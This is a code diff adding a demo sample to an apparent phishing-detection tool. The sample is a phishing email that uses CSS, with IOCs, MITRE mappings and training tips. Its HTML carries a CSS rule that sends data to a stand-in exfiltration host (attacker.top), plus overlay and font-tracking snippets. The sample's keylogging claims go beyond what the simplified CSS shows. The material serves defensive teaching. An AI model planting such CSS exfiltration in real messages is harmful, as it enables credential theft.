@@ -2842,6 +2842,35 @@ const DEMO_SAMPLES = [
       bodyHighlights: 'sign in to confirm, archived, storage maintenance'
     },
     raw: `From: Meridian IT Services <notifications@mail-server-notice.info>\nTo: employee@meridiandefense.com\nSubject: Scheduled storage maintenance \u2014 action needed by Friday\nDate: Wed, 03 Jun 2026 04:22:10 -0500\nX-Mailer: MassMail 9.1\n\nHello,\n\nAs part of scheduled storage maintenance, mailboxes approaching their allocation are being migrated to updated storage tiers. Your mailbox is currently at 96% of its allocation.\n\nPlease sign in to confirm your mailbox settings and complete the migration: https://mailbox-storage-center.info/sso\n\nAccounts not confirmed by Friday will be archived and restored on request through the service desk, which may take up to 72 hours.\n\nThank you,\nIT Services\nMeridian Defense Solutions`
+,
+  {
+    id: 'demo9', label: 'CRITICAL', risk: 'critical',
+    title: 'CSS Injection — Silent Webmail Keylogger',
+    desc: 'No links. No attachments. No JavaScript. The CSS fires on render and captures keystrokes through a hidden form element. APT28 used this technique against Ukrainian government webmail in April 2026.',
+    analysis: {
+      risk: 'critical', threatType: 'Phishing',
+      summary: 'CSS-based credential theft attack exploiting webmail rendering gaps. The email contains no links, no attachments, and no JavaScript — the malicious CSS fires the moment the email is rendered in a webmail client. A hidden select element styled as a password input captures keystrokes and exfiltrates them via CSS background-url requests. APT28 deployed this technique against Ukrainian government Roundcube installations in April 2026, four months before Portswigger publicly documented it at Black Hat USA 2026.',
+      iocs: [
+        {category:'infrastructure', type:'CSS Injection', description:'position:fixed overlay used to cover the entire webmail interface with attacker-controlled content', example:'position: fixed; top: 0; left: 0; width: 100%; height: 100%', severity:'high'},
+        {category:'infrastructure', type:'CSS Injection', description:'<select> element styled as password input — CSS keylogger component', example:'<select style="-webkit-text-security: disc; appearance: none;">', severity:'high'},
+        {category:'infrastructure', type:'CSS Injection', description:':has(option:checked) used to detect keystroke selection and trigger exfiltration', example:'div:has(option:checked) { background: url(https://attacker.top/steal) }', severity:'high'},
+        {category:'infrastructure', type:'CSS Injection', description:'@font-face with unicode-range used to measure digit heights for token extraction', example:'@font-face { font-family: tracker; unicode-range: U+0030-0039; descent-override: 200% }', severity:'high'},
+        {category:'infrastructure', type:'Suspicious Domain', description:'Exfiltration endpoint on .top TLD associated with phishing infrastructure', example:'https://attacker.top/steal?data=', severity:'high'}
+      ],
+      mitre: ['T1185 Browser Session Hijacking — CSS Injection (APT28/Portswigger)', 'T1056.003 Input Capture — Web Portal Capture via CSS Keylogger'],
+      training: {
+        title: 'CSS attacks require no click and no JavaScript',
+        explanation: 'Traditional email security training focuses on links and attachments. CSS injection bypasses both. The attack fires the moment the email renders in a webmail client — no click required. The only defenses are: (1) use a desktop email client instead of webmail, (2) disable remote image loading, (3) be suspicious of emails with unusual styling that prompts you to enter credentials. Reference: yanaivanov.com/writing/css_field_note.html',
+        redFlags: [
+          'Email contains complex CSS styling with no visible design purpose',
+          'Any credential prompt appearing after opening an email in webmail',
+          'Sender domain uses suspicious TLD (.top, .xyz, .click)',
+          'Email body contains form elements (select, input, label) with no clear purpose'
+        ]
+      },
+      bodyHighlights: 'position:fixed, :has(option:checked), @font-face, unicode-range, attacker.top'
+    },
+    raw: `From: security@booking-notify.top\nTo: yanaivanov@gmail.com\nSubject: Your booking requires verification\nDate: Sun, 17 Aug 2026 09:00:00 -0500\nX-Originating-IP: 185.234.218.47\nMIME-Version: 1.0\nContent-Type: text/html\n\n<html>\n<style>\ndiv { position: fixed; top: 0; left: 0; width: 100%; height: 100%; }\ndiv:has(option:checked) { background: url('https://attacker.top/steal?data=') }\n@font-face {\n  font-family: 'tracker';\n  unicode-range: U+0030-0039;\n  descent-override: 200%;\n}\n</style>\n<body>\n<select style="-webkit-text-security: disc; appearance: none;">\n  <option value="a">a</option>\n  <option value="b">b</option>\n</select>\n<label for="RibbonModeToggle">Click here to verify your booking</label>\n<p>Your booking has been flagged for security review. Please verify your account immediately to avoid cancellation.</p>\n</body>\n</html>`
   }
 ]
 
